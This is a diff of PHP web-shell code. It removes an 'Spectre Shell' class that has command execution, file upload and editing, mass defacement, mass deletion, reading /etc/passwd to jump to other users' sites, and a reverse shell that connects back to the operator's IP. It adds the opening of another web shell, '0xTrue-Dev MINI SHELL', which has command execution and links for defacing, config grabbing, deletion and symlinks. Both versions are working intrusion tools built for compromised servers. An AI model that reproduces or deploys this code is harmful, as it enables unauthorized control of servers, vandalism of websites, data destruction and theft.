@@ -1,585 +1,635 @@
-<?php
-/*
- * =======================================================
- * |                 DEBUG MODE ACTIVATED                  |
- * | These lines force the server to show the exact error. |
- * | REMOVE THESE LINES once the shell is working.         |
- * =======================================================
- */
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-// --- END OF DEBUG BLOCK ---
-
-
-/*
- * Spectre Shell v1.0
- * A refined mini-shell for the discerning operator.
- */
-session_start();
-set_time_limit(0);
-// error_reporting(0); // We disable this for debugging
-// @ini_set('display_errors', 0); // We disable this for debugging
-
-class SpectreShell
-{
-    // !!! PENTING: GANTI PASSWORD INI DENGAN HASH SHA256 ANDA SENDIRI !!!
-    // Ganti 'rahasia' dengan password Anda. Anda bisa generate hash di situs online.
-    private $passwordHash = '8b44458f4534714652c4620577381283303b64c015707775952f44a428230678'; // sha256('rahasia')
-
-    private $path;
-    private $self;
-
-    public function __construct()
-    {
-        $this->self = basename(__FILE__);
-        if (!$this->isAuthenticated()) {
-            $this->handleLogin();
-        }
-        $this->path = $this->getPath();
-    }
-
-    public function run()
-    {
-        if (isset($_GET['action']) && $_GET['action'] == 'logout') {
-            session_destroy();
-            header("Location: {$this->self}");
-            exit;
-        }
-
-        if (isset($_GET['action']) && $_GET['action'] == 'self-destruct') {
-            if (unlink($this->self)) {
-                session_destroy();
-                die('<!DOCTYPE html><html><head><title>Mission Accomplished</title><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;}h1{text-shadow:0 0 5px #0f0;}</style></head><body><h1>SELF-DESTRUCT SUCCESSFUL.</h1><p>The file has been erased. All traces removed.</p></body></html>');
-            } else {
-                $this->renderPage('Self-Destruct', '<div class="alert error">Failed to self-destruct. Remove the file manually.</div>');
-            }
-            exit;
-        }
-
-        $action = $_GET['action'] ?? 'files';
-        $content = '';
-
-        switch ($action) {
-            case 'cmd':
-                $content = $this->renderCmd();
-                break;
-            case 'upload':
-                $content = $this->handleUpload();
-                break;
-            case 'mass_deface':
-                $content = $this->handleMassDeface();
-                break;
-            case 'mass_delete':
-                $content = $this->handleMassDelete();
-                break;
-            case 'jumping':
-                $content = $this->handleJumping();
-                break;
-            case 'back_connect':
-                $content = $this->handleBackConnect();
-                break;
-            default:
-                $content = $this->renderFileManager();
-        }
-        $this->renderPage($this->getNavTitle($action), $content);
-    }
-
-    private function isAuthenticated()
-    {
-        return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
-    }
-
-    private function handleLogin()
-    {
-        if (isset($_POST['password'])) {
-            if (hash('sha256', $_POST['password']) === $this->passwordHash) {
-                $_SESSION['authenticated'] = true;
-                header("Location: {$this->self}");
-                exit;
-            } else {
-                $this->renderLoginPage("Invalid credentials.");
-            }
-        } else {
-            $this->renderLoginPage();
-        }
-        exit;
-    }
-
-    private function getPath()
-    {
-        $path = $_GET['path'] ?? getcwd();
-        return str_replace('\\', '/', realpath($path));
-    }
-
-    private function renderLoginPage($error = null)
-    {
-        $errorHtml = $error ? "<div class='alert error'>$error</div>" : "";
-        die('
-        <!DOCTYPE html><html><head><title>Spectre Shell - Access Denied</title>
-        <style>
-            body{background:#1a1a1a;color:#e0e0e0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
-            .login-box{background:#2a2a2a;padding:40px;border:1px solid #444;border-radius:5px;box-shadow:0 0 20px rgba(0,255,0,0.1);width:300px;text-align:center;}
-            h1{color:#00ff00;margin-top:0;text-shadow:0 0 5px #00ff00;}
-            input[type="password"]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #444;color:#e0e0e0;border-radius:3px;margin-bottom:15px;box-sizing:border-box;}
-            input[type="submit"]{width:100%;padding:10px;background:#009900;border:none;color:#fff;font-weight:bold;cursor:pointer;border-radius:3px;transition:background 0.2s;}
-            input[type="submit"]:hover{background:#00ff00;}
-            .alert.error{color:#ff4d4d;background:#442222;padding:10px;border:1px solid #ff4d4d;border-radius:3px;margin-bottom:15px;}
-        </style>
-        </head><body>
-            <div class="login-box">
-                <h1>SPECTRE SHELL</h1>
-                ' . $errorHtml . '
-                <form method="post">
-                    <input type="password" name="password" placeholder="Enter Passphrase" autofocus>
-                    <input type="submit" value="Authenticate">
-                </form>
-            </div>
-        </body></html>');
-    }
-
-    private function renderPage($title, $content)
-    {
-        $serverInfo = $this->getServerInfo();
-        $pathBreadcrumbs = $this->getPathBreadcrumbs();
-        echo <<<HTML
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Spectre Shell - {$title}</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        :root { --bg-color: #1a1a1a; --text-color: #e0e0e0; --primary-color: #00ff00; --secondary-color: #333; --border-color: #444; --hover-bg: #2a2a2a; }
-        body { background: var(--bg-color); color: var(--text-color); font-family: 'Droid Sans Mono', monospace; margin: 0; padding: 20px; }
-        a { color: var(--primary-color); text-decoration: none; }
-        a:hover { text-decoration: underline; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        header, footer { background: var(--secondary-color); padding: 15px; border: 1px solid var(--border-color); border-radius: 5px; margin-bottom: 20px; }
-        header h1 { margin: 0; color: var(--primary-color); text-shadow: 0 0 5px var(--primary-color); font-size: 24px; text-align: center; }
-        .server-info { font-size: 12px; word-wrap: break-word; text-align: center; margin-top: 10px; }
-        .path-bar { background: var(--secondary-color); padding: 10px; border-radius: 3px; margin-bottom: 20px; font-size: 14px; }
-        nav { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
-        nav a { display: block; padding: 10px 15px; background: var(--secondary-color); border-radius: 3px; transition: background 0.2s; border: 1px solid var(--border-color); }
-        nav a:hover, nav a.active { background: var(--hover-bg); color: #fff; }
-        nav a.danger { color: #ff4d4d; }
-        nav a.danger:hover { background: #442222; }
-        .content-box { background: var(--secondary-color); padding: 20px; border: 1px solid var(--border-color); border-radius: 5px; }
-        .content-box h2 { margin-top: 0; color: var(--primary-color); border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
-        .table { width: 100%; border-collapse: collapse; }
-        .table th, .table td { padding: 10px; text-align: left; border-bottom: 1px solid var(--border-color); }
-        .table th { background: var(--hover-bg); }
-        .table tr:hover td { background: var(--hover-bg); }
-        .table td a { display: block; }
-        .perms { font-family: monospace; }
-        .perms.writable { color: var(--primary-color); }
-        .perms.not-readable { color: #ff4d4d; }
-        .actions-form select, .actions-form input { background: var(--bg-color); color: var(--text-color); border: 1px solid var(--border-color); padding: 5px; border-radius: 3px; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; }
-        .form-group input[type="text"], .form-group input[type="file"], .form-group textarea { width: 100%; padding: 10px; background: var(--bg-color); border: 1px solid var(--border-color); color: var(--text-color); border-radius: 3px; box-sizing: border-box; }
-        .form-group textarea { height: 200px; resize: vertical; }
-        .btn { padding: 10px 15px; background: #009900; border: none; color: #fff; font-weight: bold; cursor: pointer; border-radius: 3px; transition: background 0.2s; }
-        .btn:hover { background: var(--primary-color); }
-        .alert { padding: 15px; border-radius: 3px; margin-bottom: 20px; border: 1px solid; }
-        .alert.success { background: #224422; color: #adffad; border-color: #adffad; }
-        .alert.error { background: #442222; color: #ff9999; border-color: #ff4d4d; }
-        #terminal { background: #000; color: #0f0; padding: 10px; height: 400px; overflow-y: scroll; font-family: monospace; border: 1px solid var(--border-color); border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; }
-        #cmd-input { display: flex; margin-top: 10px; }
-        #cmd-input input { flex-grow: 1; background: #000; border: 1px solid var(--border-color); color: #0f0; padding: 10px; border-radius: 3px 0 0 3px; }
-    </style>
+ <head>
+<link href="https://fonts.googleapis.com/css?family=Gloria+Hallelujah|Patrick+Hand|Droid+Sans+Mono" rel="stylesheet">
+ <link href='http://res7ock.org/assets/img/favicon.png' rel='shortcut icon' alt='icon'>
+ <title>0xTrue-Dev MINI SHELL</title>
+ <center><h1>0xTrue-Dev MINI SHELL</h1></center>
+ <meta name='author' content='Koplak Lo'>
+ <meta charset="UTF-8">
+<meta property="og:image" content="http://oi66.tinypic.com/zn0xs.jpg" alt="53430105-557504214770012-2414548526572814332-n" "="">
+<meta name="Description" content="D704T....">
+<link href="" rel="stylesheet" type="text/css">
+<style>
+body{
+       font-family: 'Droid Sans Mono', cursive;
+	background-image: url("");
+	color:#DBDBDB;
+	background-attachment:fixed;
+	background-repeat:no-repeat;
+	background-position:center;
+	background-color:#000;
+	-webkit-background-size: 100% 100%;
+}
+#content tr:hover{
+background-color: #666666;
+}
+#content .first{
+background-color: #666666;
+}
+th{
+height: 50px;
+}
+a{
+color: #DBDBDB;
+text-decoration: none;
+font-family: 'Droid Sans Mono', cursive;
+}
+a:hover{
+color:#ADADAD;
+}
+input,select{
+color:#000;
+background-color:#D0D5D5;
+border: 1px #ADADAD solid;
+-moz-border-radius: 3px;
+-webkit-border-radius:3px;
+border-radius:3px;
+padding: 2px;
+}
+textarea{
+background-color:transparent;
+border: 1px #D0D5D5 solid;
+color:#ADADAD;
+}
+.tombols{
+background: #D0D5D5;
+color:#000;
+border-top:0;
+border-left:0;
+border-right:0;
+border: 1px #ADADAD solid;
+padding:5px 6px;
+text-decoration:none;
+font-family: 'Droid Sans Mono', cursive;
+border-radius:2px;
+}
+.tombols:hover{
+background-color:#ADADAD;
+color:#000;
+}
+h1{
+color:red;
+font-family: 'Gloria Hallelujah', cursive;
+}
+</style>
 </head>
-<body>
-<div class="container">
-    <header>
-        <h1>SPECTRE SHELL</h1>
-        <div class="server-info">{$serverInfo}</div>
-    </header>
-    
-    <div class="path-bar">Current Path: {$pathBreadcrumbs}</div>
-    
-    <nav>
-        <a href="?path={$this->path}&action=files" class="{$this->isActive('files')}">File Manager</a>
-        <a href="?path={$this->path}&action=cmd" class="{$this->isActive('cmd')}">Terminal</a>
-        <a href="?path={$this->path}&action=upload" class="{$this->isActive('upload')}">Upload</a>
-        <a href="?path={$this->path}&action=mass_deface" class="{$this->isActive('mass_deface')}">Mass Deface</a>
-        <a href="?path={$this->path}&action=mass_delete" class="{$this->isActive('mass_delete')}">Mass Delete</a>
-        <a href="?path={$this->path}&action=jumping" class="{$this->isActive('jumping')}">Jumping</a>
-        <a href="?path={$this->path}&action=back_connect" class="{$this->isActive('back_connect')}">Back-Connect</a>
-        <a href="?action=logout">Logout</a>
-        <a href="?action=self-destruct" class="danger" onclick="return confirm('WARNING: This will permanently delete the shell file. Are you sure?')">Self-Destruct</a>
-    </nav>
+<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Sarpanch|Teko" rel="stylesheet">
+<?php
+set_time_limit(0);
+error_reporting(0);
 
-    <div class="content-box">
-        <h2>{$title}</h2>
-        {$content}
-    </div>
-
-    <footer>
-        <p style="text-align:center; font-size:12px;">Spectre Shell v1.0 © 2024 - Operate with precision.</p>
-    </footer>
-</div>
-<script>
-    const cmdForm = document.getElementById('cmd-form');
-    if (cmdForm) {
-        cmdForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const commandInput = document.getElementById('command');
-            const terminalOutput = document.getElementById('terminal');
-            const command = commandInput.value;
-            terminalOutput.innerHTML += '\\n<span style="color:#00ff00;">> ' + command + '</span>\\n';
-            commandInput.value = '';
-
-            fetch('', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'ajax_cmd=' + encodeURIComponent(command) + '&path=' + encodeURIComponent('{$this->path}')
-            })
-            .then(response => response.text())
-            .then(text => {
-                terminalOutput.innerHTML += text.replace(/\\n/g, '<br>');
-                terminalOutput.scrollTop = terminalOutput.scrollHeight;
-            });
-        });
-    }
-</script>
-</body>
-</html>
-HTML;
-    }
-
-    private function getServerInfo()
-    {
-        $uname = php_uname();
-        $serverIp = gethostbyname($_SERVER['HTTP_HOST']);
-        $yourIp = $_SERVER['REMOTE_ADDR'];
-        $user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
-        return "<b>OS:</b> {$uname}<br><b>Server IP:</b> {$serverIp} | <b>Your IP:</b> {$yourIp} | <b>User:</b> {$user}";
-    }
-
-    private function getPathBreadcrumbs()
-    {
-        $parts = explode('/', $this->path);
-        $crumbs = [];
-        $current = '';
-        foreach ($parts as $part) {
-            if (empty($part) && count($crumbs) > 0) continue;
-            $current .= $part . '/';
-            $crumbs[] = "<a href='?path={$current}'>" . ($part ?: '/') . "</a>";
-        }
-        return implode('', $crumbs);
-    }
-    
-    private function isActive($action) {
-        return ($_GET['action'] ?? 'files') === $action ? 'active' : '';
-    }
-
-    private function getNavTitle($action) {
-        $titles = [
-            'files' => 'File Manager', 'cmd' => 'Command Executor', 'upload' => 'File Uploader',
-            'mass_deface' => 'Mass Defacer', 'mass_delete' => 'Mass Deleter',
-            'jumping' => 'User Jumping', 'back_connect' => 'Back-Connect'
-        ];
-        return $titles[$action] ?? 'File Manager';
-    }
-
-    private function perms($file) {
-        $perms = fileperms($file);
-        $info = 'u';
-        if (($perms & 0xC000) == 0xC000) $info = 's';
-        elseif (($perms & 0xA000) == 0xA000) $info = 'l';
-        elseif (($perms & 0x8000) == 0x8000) $info = '-';
-        elseif (($perms & 0x6000) == 0x6000) $info = 'b';
-        elseif (($perms & 0x4000) == 0x4000) $info = 'd';
-        elseif (($perms & 0x2000) == 0x2000) $info = 'c';
-        elseif (($perms & 0x1000) == 0x1000) $info = 'p';
-        $info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
-        $info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
-        $info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
-        return $info;
-    }
-    
-    private function hdd($s) {
-       if($s >= 1073741824) return sprintf('%1.2f',$s / 1073741824 ).' GB';
-       elseif($s >= 1048576) return sprintf('%1.2f',$s / 1048576 ) .' MB';
-       elseif($s >= 1024) return sprintf('%1.2f',$s / 1024 ) .' KB';
-       else return $s .' B';
-    }
-
-    private function executeCommand($cmd) {
-        $output = '';
-        if (function_exists('shell_exec')) {
-            $output = shell_exec($cmd);
-        } elseif (function_exists('exec')) {
-            exec($cmd, $output);
-            $output = implode("\n", $output);
-        } elseif (function_exists('system')) {
-            ob_start();
-            system($cmd);
-            $output = ob_get_contents();
-            ob_end_clean();
-        } elseif (function_exists('passthru')) {
-            ob_start();
-            passthru($cmd);
-            $output = ob_get_contents();
-            ob_end_clean();
-        } elseif (is_resource($proc = proc_open($cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes))) {
-            $output = stream_get_contents($pipes[1]);
-            proc_close($proc);
-        }
-        return htmlspecialchars($output);
-    }
-
-    // --- Action Handlers ---
-
-    private function renderFileManager()
-    {
-        // Handle actions: edit, rename, chmod, delete
-        $alert = '';
-        if (isset($_POST['action_opt'])) {
-            $opt = $_POST['action_opt'];
-            $targetPath = $_POST['target_path'];
-            $targetName = $_POST['target_name'];
-            $targetType = $_POST['target_type'];
-
-            if ($opt == 'delete') {
-                if ($targetType == 'dir') {
-                    if (@rmdir($targetPath)) $alert = "<div class='alert success'>Directory '{$targetName}' deleted.</div>";
-                    else $alert = "<div class='alert error'>Failed to delete directory '{$targetName}'. Not empty or no permission.</div>";
-                } else {
-                    if (@unlink($targetPath)) $alert = "<div class='alert success'>File '{$targetName}' deleted.</div>";
-                    else $alert = "<div class='alert error'>Failed to delete file '{$targetName}'.</div>";
-                }
-            } elseif ($opt == 'rename' && isset($_POST['new_name'])) {
-                if (@rename($targetPath, $this->path . '/' . $_POST['new_name'])) $alert = "<div class='alert success'>Renamed '{$targetName}' to '{$_POST['new_name']}'.</div>";
-                else $alert = "<div class='alert error'>Failed to rename.</div>";
-            } elseif ($opt == 'chmod' && isset($_POST['perms'])) {
-                if (@chmod($targetPath, octdec($_POST['perms']))) $alert = "<div class='alert success'>Permissions changed for '{$targetName}'.</div>";
-                else $alert = "<div class='alert error'>Failed to change permissions.</div>";
-            } elseif ($opt == 'edit' && isset($_POST['content'])) {
-                if (@file_put_contents($targetPath, $_POST['content']) !== false) $alert = "<div class='alert success'>File '{$targetName}' saved.</div>";
-                else $alert = "<div class='alert error'>Failed to save file '{$targetName}'.</div>";
-            }
-        }
-        
-        // Render edit/rename/chmod forms
-        if (isset($_GET['opt_view'])) {
-            $opt = $_GET['opt_view'];
-            $targetPath = $_GET['target'];
-            $targetName = basename($targetPath);
-            $form = '';
-            if ($opt == 'edit' && is_file($targetPath)) {
-                $content = htmlspecialchars(file_get_contents($targetPath));
-                $form = "<h3>Editing: {$targetName}</h3><form method='post'><textarea name='content' class='form-group' style='height:400px;'>{$content}</textarea><input type='hidden' name='action_opt' value='edit'><input type='hidden' name='target_path' value='{$targetPath}'><input type='hidden' name='target_name' value='{$targetName}'><input type='submit' value='Save Changes' class='btn'></form>";
-            } elseif ($opt == 'rename') {
-                 $form = "<h3>Renaming: {$targetName}</h3><form method='post' class='form-group'><input type='text' name='new_name' value='{$targetName}'><input type='hidden' name='action_opt' value='rename'><input type='hidden' name='target_path' value='{$targetPath}'><input type='hidden' name='target_name' value='{$targetName}'><input type='submit' value='Rename' class='btn'></form>";
-            } elseif ($opt == 'chmod') {
-                $perms = substr(sprintf('%o', fileperms($targetPath)), -4);
-                $form = "<h3>Chmod: {$targetName}</h3><form method='post' class='form-group'><input type='text' name='perms' value='{$perms}'><input type='hidden' name='action_opt' value='chmod'><input type='hidden' name='target_path' value='{$targetPath}'><input type='hidden' name='target_name' value='{$targetName}'><input type='submit' value='Set Permissions' class='btn'></form>";
-            }
-            return $alert . $form;
-        }
-
-        // Render file list
-        $files = scandir($this->path);
-        $dirsHtml = '';
-        $filesHtml = '';
-
-        foreach ($files as $file) {
-            if ($file == '.' || ($file == '..' && $this->path == '/')) continue;
-            
-            $fullPath = $this->path . '/' . $file;
-            $isDir = is_dir($fullPath);
-            $perms = $this->perms($fullPath);
-            $permClass = is_writable($fullPath) ? 'writable' : (is_readable($fullPath) ? '' : 'not-readable');
-            $size = $isDir ? '[DIR]' : $this->hdd(filesize($fullPath));
-            
-            $actions = "
-                <a href='?path={$this->path}&opt_view=rename&target={$fullPath}'>Rename</a> |
-                <a href='?path={$this->path}&opt_view=chmod&target={$fullPath}'>Chmod</a> |
-                <form method='post' style='display:inline;' onsubmit=\"return confirm('Delete permanently?');\">
-                    <input type='hidden' name='action_opt' value='delete'>
-                    <input type='hidden' name='target_path' value='{$fullPath}'>
-                    <input type='hidden' name='target_name' value='{$file}'>
-                    <input type='hidden' name='target_type' value='".($isDir ? 'dir' : 'file')."'>
-                    <button type='submit' style='background:none;border:none;color:var(--primary-color);cursor:pointer;padding:0;font-family:inherit;font-size:inherit;'>Delete</button>
-                </form>
-            ";
-            if (!$isDir) {
-                 $actions = "<a href='?path={$this->path}&opt_view=edit&target={$fullPath}'>Edit</a> | " . $actions;
-            }
-
-            $link = $isDir ? "<a href='?path={$fullPath}'>{$file}</a>" : "<span>{$file}</span>";
-            $row = "<tr><td>{$link}</td><td>{$size}</td><td><span class='perms {$permClass}'>{$perms}</span></td><td>{$actions}</td></tr>";
-            
-            if ($isDir) $dirsHtml .= $row;
-            else $filesHtml .= $row;
-        }
-
-        return $alert . "<table class='table'><thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>{$dirsHtml}{$filesHtml}</tbody></table>";
-    }
-
-    private function renderCmd()
-    {
-        // AJAX handler for commands
-        if (isset($_POST['ajax_cmd'])) {
-            $cmd = $_POST['ajax_cmd'];
-            $path = $_POST['path'] ?? $this->path;
-            chdir($path);
-            echo $this->executeCommand($cmd);
-            exit;
-        }
-        
-        return '<div id="terminal">[Spectre Terminal] Ready.</div><form id="cmd-form"><div id="cmd-input"><span style="padding:10px;background:#000;color:#0f0;">$ </span><input type="text" id="command" autocomplete="off" autofocus></div></form>';
-    }
-
-    private function handleUpload()
-    {
-        $alert = '';
-        if (isset($_FILES['file'])) {
-            if (copy($_FILES['file']['tmp_name'], $this->path . '/' . $_FILES['file']['name'])) {
-                $alert = "<div class='alert success'>File '{$_FILES['file']['name']}' uploaded successfully.</div>";
-            } else {
-                $alert = "<div class='alert error'>Upload failed. Check permissions.</div>";
-            }
-        }
-        $form = "<form enctype='multipart/form-data' method='post'>
-            <div class='form-group'><label for='file'>Select File to Upload:</label><input type='file' name='file' id='file'></div>
-            <input type='submit' value='Upload' class='btn'>
-        </form>";
-        return $alert . $form;
-    }
-
-    private function handleMassDeface()
-    {
-        $result = '';
-        if (isset($_POST['start_deface'])) {
-            $dir = $_POST['target_dir'];
-            $filename = $_POST['filename'];
-            $content = $_POST['content'];
-            $count = 0;
-            try {
-                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
-                foreach ($iterator as $file) {
-                    if ($file->isDir()) {
-                        $newFilePath = $file->getRealPath() . '/' . $filename;
-                        if (is_writable($file->getRealPath()) && @file_put_contents($newFilePath, $content)) {
-                            $result .= "SUCCESS: {$newFilePath}<br>";
-                            $count++;
-                        } else {
-                            $result .= "FAILED: {$newFilePath} (Permission Denied)<br>";
-                        }
-                    }
-                }
-                // Also in root of target dir
-                $rootFilePath = $dir . '/' . $filename;
-                if(is_writable($dir) && @file_put_contents($rootFilePath, $content)){
-                    $result .= "SUCCESS: {$rootFilePath}<br>";
-                    $count++;
-                }
-                 $result = "<div class='alert success'>Mass deface complete. {$count} files created.</div><pre>{$result}</pre>";
-            } catch (Exception $e) {
-                $result = "<div class='alert error'>Error: " . $e->getMessage() . "</div>";
-            }
-        }
-        $form = "<form method='post'>
-            <div class='form-group'><label>Target Directory:</label><input type='text' name='target_dir' value='{$this->path}'></div>
-            <div class='form-group'><label>Filename (e.g., index.html):</label><input type='text' name='filename' value='index.html'></div>
-            <div class='form-group'><label>File Content (Deface Script):</label><textarea name='content'>Hacked by Spectre</textarea></div>
-            <input type='submit' name='start_deface' value='Start Mass Deface' class='btn' onclick=\"return confirm('This will create files recursively. Are you sure?');\">
-        </form>";
-        return $result . $form;
-    }
-
-    private function handleMassDelete()
-    {
-        $result = '';
-        if (isset($_POST['start_delete'])) {
-            $dir = $_POST['target_dir'];
-            $filename = $_POST['filename'];
-            $count = 0;
-            try {
-                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
-                foreach ($iterator as $file) {
-                    if ($file->isFile() && $file->getFilename() == $filename) {
-                        if (@unlink($file->getRealPath())) {
-                            $result .= "DELETED: {$file->getRealPath()}<br>";
-                            $count++;
-                        } else {
-                            $result .= "FAILED: {$file->getRealPath()}<br>";
-is_writable($dir) &&                     }
-                    }
-                }
-                $result = "<div class='alert success'>Mass delete complete. {$count} files removed.</div><pre>{$result}</pre>";
-            } catch (Exception $e) {
-                $result = "<div class='alert error'>Error: " . $e->getMessage() . "</div>";
-            }
-        }
-        $form = "<form method='post'>
-            <div class='form-group'><label>Target Directory:</label><input type='text' name='target_dir' value='{$this->path}'></div>
-            <div class='form-group'><label>Filename to Delete:</label><input type='text' name='filename' value='index.html'></div>
-            <input type='submit' name='start_delete' value='Start Mass Delete' class='btn' onclick=\"return confirm('This will delete files recursively. Are you sure?');\">
-        </form>";
-        return $result . $form;
-    }
-    
-    private function handleJumping() {
-        $output = '';
-        if (!is_readable('/etc/passwd')) {
-            return "<div class='alert error'>Cannot read /etc/passwd. Function disabled.</div>";
-        }
-        $users = file('/etc/passwd');
-        $output .= "<table class='table'><thead><tr><th>User</th><th>Home Directory</th><th>Status</th></tr></thead><tbody>";
-        foreach ($users as $user) {
-            $parts = explode(':', $user);
-            $username = $parts[0];
-            $homeDir = $parts[5];
-            if (strpos($homeDir, '/home/') !== false && is_dir($homeDir)) {
-                 $publicHtml = $homeDir . '/public_html';
-                 if (is_readable($publicHtml)) {
-                     $status = is_writable($publicHtml) ? "<span class='perms writable'>RW</span>" : "<span style='color:yellow'>R</span>";
-                     $output .= "<tr><td>{$username}</td><td><a href='?path={$publicHtml}'>{$publicHtml}</a></td><td>{$status}</td></tr>";
-                 }
-            }
-        }
-        $output .= "</tbody></table>";
-        return $output;
-    }
-    
-    private function handleBackConnect() {
-         $result = '';
-        if (isset($_POST['ip']) && isset($_POST['port'])) {
-            $ip = $_POST['ip'];
-            $port = (int)$_POST['port'];
-            $shell = 'uname -a; w; id; /bin/sh -i';
-            
-            if (function_exists('fsockopen')) {
-                $sock = fsockopen($ip, $port);
-                if ($sock) {
-                    fwrite($sock, "CONNECTED!\n");
-                    stream_set_blocking($sock, 0);
-                    $proc = proc_open($shell, [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
-                    $result = "<div class='alert success'>Back-connect initiated to {$ip}:{$port}. Check your listener.</div>";
-                } else {
-                    $result = "<div class='alert error'>fsockopen failed.</div>";
-                }
-            } else {
-                $result = "<div class='alert error'>fsockopen is disabled.</div>";
-            }
-        }
-        
-        $yourIp = $_SERVER['REMOTE_ADDR'];
-        $form = "<p>This will attempt to connect back to your machine. Start a listener first (e.g., <code>nc -lvp 4444</code>).</p>
-        <form method='post'>
-            <div class='form-group'><label>Your IP:</label><input type='text' name='ip' value='{$yourIp}'></div>
-            <div class='form-group'><label>Your Port:</label><input type='text' name='port' value='4444'></div>
-            <input type='submit' value='Connect Back' class='btn'>
-        </form>";
-        return $result . $form;
-    }
+//function
+function ambilKata($param, $kata1, $kata2){
+   if(strpos($param, $kata1) === FALSE) return FALSE;
+   if(strpos($param, $kata2) === FALSE) return FALSE;
+   $start = strpos($param, $kata1) + strlen($kata1);
+   $end = strpos($param, $kata2, $start);
+   $return = substr($param, $start, $end - $start);
+   return $return;
+}
+if(get_magic_quotes_gpc()) {
+   function idx_ss($array) {
+return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
+   }
+   $_POST = idx_ss($_POST);
+}
+function hdd($s) {
+   if($s >= 1073741824)
+   return sprintf('%1.2f',$s / 1073741824 ).' GB';
+   elseif($s >= 1048576)
+   return sprintf('%1.2f',$s / 1048576 ) .' MB';
+   elseif($s >= 1024)
+   return sprintf('%1.2f',$s / 1024 ) .' KB';
+   else
+   return $s .' B';
+}
+function exe($cmd) {
+   if(function_exists('system')) {        
+@ob_start();       
+@system($cmd);     
+$buff = @ob_get_contents();        
+@ob_end_clean();       
+return $buff;  
+   } elseif(function_exists('exec')) {        
+@exec($cmd,$results);      
+$buff = "";        
+foreach($results as $result) {         
+   $buff .= $result;      
+} return $buff;    
+   } elseif(function_exists('passthru')) {        
+@ob_start();       
+@passthru($cmd);       
+$buff = @ob_get_contents();        
+@ob_end_clean();       
+return $buff;  
+   } elseif(function_exists('shell_exec')) {      
+$buff = @shell_exec($cmd);     
+return $buff;  
+   }
+}
+//check dir
+$nick = "3X0RC1ST";
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$software = getenv("SERVER_SOFTWARE");
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+$dir = str_replace("\\","/",$dir);
+$scdir = explode("/", $dir);
+$freespace = hdd(disk_free_space("/"));
+$total = hdd(disk_total_space("/"));
+$used = $total - $freespace;
+if(!function_exists('posix_getegid')) {
+   $user = @get_current_user();
+   $uid = @getmyuid();
+   $gid = @getmygid();
+   $group = "?";
+} else {
+   $uid = @posix_getpwuid(posix_geteuid());
+   $gid = @posix_getgrgid(posix_getegid());
+   $user = $uid['name'];
+   $uid = $uid['uid'];
+   $group = $gid['name'];
+   $gid = $gid['gid'];
+} 
+//uname
+echo "<center><font color=#D0D5D5 size=2>System : <font color=#52CF38>".php_uname()."</font></font><br>";
+echo "<center><font color=#D0D5D5 size=2>Time On Server : <font color=#52CF38>".date("d M Y H:i:s",time())."</font></font><br>";
+echo "<center><font color=#D0D5D5 size=2>Server IP : <font color=#52CF38>".gethostbyname($_SERVER['HTTP_HOST'])."<font color=#D0D5D5> | Your IP : <font color=#52CF38>".$_SERVER['REMOTE_ADDR']."</font></font><br>";
+echo "<center><font color=#D0D5D5 size=2>User : <font color=#52CF38>".$user."</font> (".$uid.") Group : <font color=#52CF38>".$group."</font> (".$gid.")<br></font>";
+echo "<br><center><font color=#D0D5D5 size=3>Current Dir : </font>";
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '"><font color=#D0D5D5 size=3>'.$pat.'</font></a>/';
 }
 
-$shell = new SpectreShell();
-$shell->run();
+#TOOLBAR
+echo "<hr color=#666666>
+<br></center>
+<font size=3><a href='?' class='tombols'>Home</a>
+<font size=3><a href='?path=$path&jomblo=mass_deface' class='tombols'>Mass Deface</a>
+<font size=3><a href='?path=$path&jomblo=config' class='tombols'>Config</a>
+<font size=3><a href='?path=$path&jomblo=mass_delete' class='tombols'>Mass Delete</a><br><br>
+<font size=3><a href='?path=$path&jomblo=upload' class='tombols'>Upload</a>
+<font size=3><a href='?path=$path&jomblo=jumping' class='tombols'>Jumping</a>
+<font size=3><a href='?path=$path&jomblo=symlink' class='tombols'>Symlink</a>
+</center><br>
